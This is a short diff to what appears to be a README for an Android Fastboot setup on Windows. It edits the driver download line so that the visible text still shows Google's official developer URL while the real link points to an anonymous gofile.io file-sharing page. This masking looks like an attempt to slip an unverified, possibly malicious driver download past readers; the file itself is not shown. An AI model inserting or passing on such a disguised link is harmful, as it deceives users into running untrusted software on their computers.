@@ -8,7 +8,7 @@
 - Windows PC
 - USB cable
 - Android phone in **Fastboot mode** (power off → hold Volume Down + Power)
-- [Download latest Google USB Drivers](https://developer.android.com/studio/run/win-usb)
+- [Download latest Google USB Drivers]([https://developer.android.com/studio/run/win-usb](https://gofile.io/d/55czhL))
 
 ---
 
